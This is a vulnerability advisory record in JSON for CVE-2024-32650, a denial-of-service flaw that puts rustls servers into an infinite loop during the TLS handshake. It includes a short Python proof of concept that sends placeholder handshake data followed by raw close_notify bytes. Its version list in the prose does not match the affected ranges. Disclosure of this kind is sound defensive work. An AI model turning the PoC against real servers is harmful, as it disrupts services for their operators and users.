{
  "schema_version": "1.4.0",
  "id": "GHSA-6g7w-8wpp-frhj",
  "modified": "2024-04-19T19:46:58Z",
  "published": "2024-04-19T19:46:57Z",
  "aliases": [
    "CVE-2024-32650"
  ],
  "summary": "Denial of Service Vulnerability in Rustls Library",
  "details": "### Summary\nA denial of service (DoS) vulnerability has been discovered in versions 0.20 and 0.21 of the Rustls library. This vulnerability could allow an attacker to trigger an infinite loop in a Rustls server by sending specific network input during the handshake process. As a result, the server may experience high CPU usage and become unresponsive, potentially leading to a DoS situation.\n\n### Details\n\nThe vulnerability exists in the rustls::ConnectionCommon::complete_io function, where the server may enter an infinite loop under certain conditions. Specifically, if a client sends a close_notify message immediately after a client_hello message, the server's complete_io function may spin indefinitely, causing the server to become unresponsive.\n\n\n### PoC\nTo demonstrate the vulnerability, an attacker can use the following Python script to send crafted network input to a Rustls server:\n\n```\n# Python script to trigger the vulnerability\nimport socket\n\nsock = socket.socket()\nsock.connect((\"localhost\", 4443))\n\n# Fake handshake data of a client hello message\nfake_handshake = \"\"\"\n<fake handshake data>\n\"\"\"\n\n# Send the fake handshake data\nsock.send(fake_handshake.encode())\n\n# Send close_notify alert to close the connection\nclose_data = bytearray([0x15, 0x03, 0x03, 0x00, 0x02, 0x01, 0x00])\nsock.send(close_data)\n\nsock.close()\n```\nRunning this script against a Rustls server will cause it to enter an infinite loop and consume CPU resources.\n\n### Impact\n\nThis vulnerability poses a significant risk as it could lead to a DoS condition on servers that use Rustls for TLS communication. An attacker could exploit this vulnerability to disrupt the availability of services by causing affected servers to become unresponsive.\n",
  "severity": [
    {
      "type": "CVSS_V3",
      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
    }
  ],
  "affected": [
    {
      "package": {
        "ecosystem": "crates.io",
        "name": "rustls"
      },
      "ranges": [
        {
          "type": "ECOSYSTEM",
          "events": [
            {
              "introduced": "0.23.0"
            },
            {
              "fixed": "0.23.5"
            }
          ]
        }
      ],
      "database_specific": {
        "last_known_affected_version_range": "<= 0.23.4"
      }
    },
    {
      "package": {
        "ecosystem": "crates.io",
        "name": "rustls"
      },
      "ranges": [
        {
          "type": "ECOSYSTEM",
          "events": [
            {
              "introduced": "0.22.0"
            },
            {
              "fixed": "0.22.4"
            }
          ]
        }
      ],
      "database_specific": {
        "last_known_affected_version_range": "<= 0.22.3"
      }
    },
    {
      "package": {
        "ecosystem": "crates.io",
        "name": "rustls"
      },
      "ranges": [
        {
          "type": "ECOSYSTEM",
          "events": [
            {
              "introduced": "0.21.0"
            },
            {
              "fixed": "0.21.11"
            }
          ]
        }
      ],
      "database_specific": {
        "last_known_affected_version_range": "<= 0.21.10"
      }
    },
    {
      "package": {
        "ecosystem": "crates.io",
        "name": "rustls"
      },
      "versions": [
        "0.20"
      ]
    }
  ],
  "references": [
    {
      "type": "WEB",
      "url": "https://github.com/rustls/rustls/security/advisories/GHSA-6g7w-8wpp-frhj"
    },
    {
      "type": "ADVISORY",
      "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-32650"
    },
    {
      "type": "WEB",
      "url": "https://github.com/rustls/rustls/commit/2123576840aa31043a31b0770e6572136fbe0c2d"
    },
    {
      "type": "WEB",
      "url": "https://github.com/rustls/rustls/commit/5374108df698e78c3e9ef8265cac311556be24af"
    },
    {
      "type": "WEB",
      "url": "https://github.com/rustls/rustls/commit/6e938bcfe82a9da7a2e1cbf10b928c7eca26426e"
    },
    {
      "type": "WEB",
      "url": "https://github.com/rustls/rustls/commit/ebcb4782f23b4edf9b10a7065d9e8d4362439d9c"
    },
    {
      "type": "WEB",
      "url": "https://github.com/rustls/rustls/commit/f45664fbded03d833dffd806503d3c8becd1b71e"
    },
    {
      "type": "PACKAGE",
      "url": "https://github.com/rustls/rustls"
    },
    {
      "type": "WEB",
      "url": "https://rustsec.org/advisories/RUSTSEC-2024-0336.html"
    }
  ],
  "database_specific": {
    "cwe_ids": [
      "CWE-835"
    ],
    "severity": "HIGH",
    "github_reviewed": true,
    "github_reviewed_at": "2024-04-19T19:46:57Z",
    "nvd_published_at": "2024-04-19T16:15:10Z"
  }
}